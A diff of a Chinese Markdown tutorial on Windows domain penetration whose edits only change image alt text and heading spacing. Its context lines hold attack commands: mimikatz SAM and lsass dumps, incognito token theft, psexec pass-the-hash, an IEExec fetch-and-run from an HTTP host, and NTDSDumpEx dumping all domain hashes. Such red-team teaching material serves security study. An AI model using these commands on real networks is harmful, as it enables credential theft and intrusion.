@@ -68,7 +68,7 @@ Active Directory存储了有关网络对象的信息，并且让管理员和用�
 
 登录到域控制器上，对一切权限进行控制，而不用到每一台域机器电脑前进行设置。
 
-#### 5 、域用户组
+#### 5、域用户组
 
 公司很多员工的权限都是相同的，那我们可以通过使用分组将不同的用户放入不同的分组，对这些相同的权限只需要设置一次，然后将改权限分配给该组。免去了对每个用户进行设置的麻烦。
 
@@ -119,7 +119,7 @@ Active Directory存储了有关网络对象的信息，并且让管理员和用�
 
 返回域控和其相应的IP地址，XXXX是上一步结果中的一个域
 
-![image](1.png)
+![](1.png)
 
 ### 二、域环境信息收集
 
@@ -131,7 +131,7 @@ Csvde是windows Server 2008 的内置命令行工具，位于%windir%/system32�
 
 `csvde -setspn domain-f c:\domain.scv`， `domain` 是域名称，`c:\domain.scv`是保存路径和文件格式
 
-![image](2.png)
+![](2.png)
 
 - LDAP的存储规则
 - 区分名（DN，Distinguished Name）一个条目的区分名称叫做“dn”或者叫做区分名。在一个目录中这个名称总是唯一的。
@@ -140,7 +140,7 @@ Csvde是windows Server 2008 的内置命令行工具，位于%windir%/system32�
 - O=Organization为组织名，可以3-64个字符长
 - C=Country为国家名，可选，为2个字符长
 
-![image](3.png)
+![](3.png)
 
 #### 2、Setspn
 
@@ -150,7 +150,7 @@ SPN官方名称即为“服务主体名称”，本质上存的就是域内各�
 
 借助SPN快速定位当前目标域中所有存活的各类服务器
 
-![image](4.png)
+![](4.png)
 
 #### 3、Dnsdump
 
@@ -159,7 +159,7 @@ dnsdump.exe -u 域名\域用户 -p 域密码 域孔机器名
 dnsdump.exe -u hack\iis_user -p 1qaz@WSX windows_server_2016_dc -r
 ```
 
-![image](5.png)
+![](5.png)
 
 4 、Net
 
@@ -171,9 +171,9 @@ net group "domain computers" /domain 	查看域机器
 net group /domain 						查询域里面的组
 ```
 
-![image](6.png)
+![](6.png)
 
-![image](7.png)
+![](7.png)
 
 ```
 net view				查看同一域内机器列表
@@ -183,7 +183,7 @@ net view /domain		查看内网存在多少个域
 net view /domain:XYZ	查看XYZ域中的机器列表
 ```
 
-![image](8.png)
+![](8.png)
 
 
 
@@ -191,7 +191,7 @@ net view /domain:XYZ	查看XYZ域中的机器列表
 
 `nbtscan.exe 192.168.52.0/24`
 
-![image](9.png)
+![](9.png)
 
 
 
@@ -203,7 +203,7 @@ net view /domain:XYZ	查看XYZ域中的机器列表
 
 横向渗透的思路（适用于工作组渗透和域渗透）
 
-![image](10.png)
+![](10.png)
 
 
 
@@ -246,11 +246,11 @@ msf > exploit
 
 生成的shellcode放入下图代码中标记的位置
 
-![image](11.png)
+![](11.png)
 
 编译生成dll执行，成功上线
 
-![image](12.png)
+![](12.png)
 
 #### 2、注册表读取密码
 
@@ -268,7 +268,7 @@ mimikatz.exe
 lsadump::sam /sam:Sam.hiv /system:Sys.hiv
 ```
 
-![image](13.png)
+![](13.png)
 
 #### 3、Lsass读取内存hash
 
@@ -284,13 +284,13 @@ mimikatz.exe "sekurlas::minidump lsass.dmp" "log" "sekulsa::logonpasswords"
 
 Win2012演示如下：
 
-![image](14.png)
+![](14.png)
 
-![image](15.png)
+![](15.png)
 
 Win2008演示如下：
 
-![image](16.png)
+![](16.png)
 
 #### 4、LaZagne工具获取密码
 
@@ -298,7 +298,7 @@ LaZagne取各种连接工具密码、浏览器保存密码等
 
 下载地址：`https://github.com/AlessandroZ/LaZagne`
 
-![image](17.png)
+![](17.png)
 
 #### 5、凭证窃取
 
@@ -306,7 +306,7 @@ LaZagne取各种连接工具密码、浏览器保存密码等
 
 登录一台机器本地账户发现机器运行如下域用户进行
 
-![image](18.png)
+![](18.png)
 
 通过incognito工具窃取凭据
 
@@ -319,7 +319,7 @@ incognito.exe list_tokens -u
 incognito.exe execute -c "HACK\Administrator" cmd.exe
 ```
 
-![image](19.png)
+![](19.png)
 
 
 
@@ -350,7 +350,7 @@ copy sbn.exe \\192.168.52.2\C$\windows\temp						复制本地文件到目标服�
 copy \\192.168.52.2\C$\windows\temp\hash.txt					复制目标服务器文件到本地
 ```
 
-![image](20.png)
+![](20.png)
 
 ##### c 、Schtasks计划任务执行命令
 
@@ -367,7 +367,7 @@ schtasks /run /tn taskName /s 域机器IP /U 域\域用户 /P 域用户密码
 schtasks /F /delete /tn taskName /s 域机器IP /U 域\域用户  /P  域用户密码
 ```
 
-![image](21.png)
+![](21.png)
 
 ##### d、psexec执行命令
 
@@ -393,7 +393,7 @@ psexec.exe -hashes :用户hash 域名/用户名@目标IP
 psexec.exe -hashes:70a50724b37f6d3d03d00c24e946fde3 hack/administrator@192.168.52.2
 ```
 
-![image](22.png)
+![](22.png)
 
 
 
@@ -443,14 +443,14 @@ C:\Windows\microsoft.NET\Framework\v2.0.50727> IEExec.exe http://192.168.1.1/tes
 reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
 ```
 
-![image](23.png)
+![](23.png)
 
 ```
 // 直接查询HKEY_CURRENT_USER(pac 代理)
 reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL
 ```
 
-![image](24.png)
+![](24.png)
 
 #### 8、windows api使用
 
@@ -464,7 +464,7 @@ NetLocalGroupGetMembers.exe:查询目标服务器本地管理组的成员。
 
 NetUserEnum.exe:查询目标服务器所有用户，包括隐藏用户。
 
-![image](25.png)
+![](25.png)
 
 #### 9、导出域hash
 
@@ -499,11 +499,11 @@ reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv
 NTDSDumpEx.exe -d ntds.dit -o hash.txt -s Sys.hiv -h
 ```
 
-![image](26.png)
+![](26.png)
 
 最后成功获取当前域控中所有域账户和密码
 
-![image](27.png)
+![](27.png)
 
 
 ## 0x04 参考资料
